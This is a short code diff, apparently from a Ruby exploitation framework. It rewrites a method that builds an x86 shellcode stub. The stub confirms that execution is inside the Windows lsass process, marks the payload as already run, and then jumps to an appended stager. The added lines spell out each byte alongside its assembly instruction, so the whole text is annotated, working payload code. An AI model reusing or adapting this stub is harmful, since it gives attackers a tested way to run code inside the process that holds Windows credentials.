@@ -51,13 +51,32 @@ protected
 	# stub also makes sure that the payload does not run more than
 	# once.
 	#
-	def self._run_only_in_lsass_stub(append = '')
-		"\x60\xbb\x3c\x06\x02\x00\x8b\x0b\x03\x4b\x03\x81\xf9" +
-		"\x6c\x61\x73\x73\x75\x13\x6a\x30\x5b\x64\x8b\x1b\x43" +
-		"\x43\x43\x80\x3b\x01\x74\x05\xc6\x03\x01" +
-		"\xeb" + [append.length + 1].pack('C') + 
-		"\x61" + append
+
+	# This little bit was written by jc. If there are bugs or something weird with this,
+	# check here first. 
+	def self._run_only_in_lsass_stub(append = '') 
+		"\x60" + 						# pushad
+		"\x8b\x1d\x3c\x00\x02\x00" +	# mov ebx, 0x0002003c
+		"\x83\xc3\x28" +				# add ebx, 0x28
+		"\x81\xfb\x00\x06\x02\x00" +	# cmp ebx 00020608
+		"\x7e\x28" +					# jl restore_regs+
+		"\x81\xfb\x00\x08\x02\x00" +	# cmp ebx, 00020800
+		"\x7d\x20" + 					# jg restore_regs
+		"\x8b\x0b" + 					# mov  ecx, [ebx] 
+		"\x03\x4b\x03"+					# add  ecx, [ebx+3]
+		"\x81\xf9\x6c\x61\x73\x73"+		# cmp ecx, 0x7373616c 
+		"\x75\x13"+ 					# jnz restore_regs
+		"\x6a\x30" +					# push byte 0x30
+		"\x5b\x64" +					# pop ebx
+		"\x8b\x1b"+ 					# mov  ebx, [fs:ebx]
+		"\x43\x43\x43" +				# inc ebx inc ebx inc ebx	
+		"\x80\x3b\x01" +				# cmp  byte [ebx], 0x1 check for has_been_run
+		"\x74\x05" +					# jz restore_regs
+		"\xc6\x03\x01"+					# mov  byte [ebx], 0x1 set has_been_run
+		"\xeb" + [append.length + 1].pack('C') +  # jmp stager
+		"\x61" + append						      # restore regs
 	end
+
 
 end
 
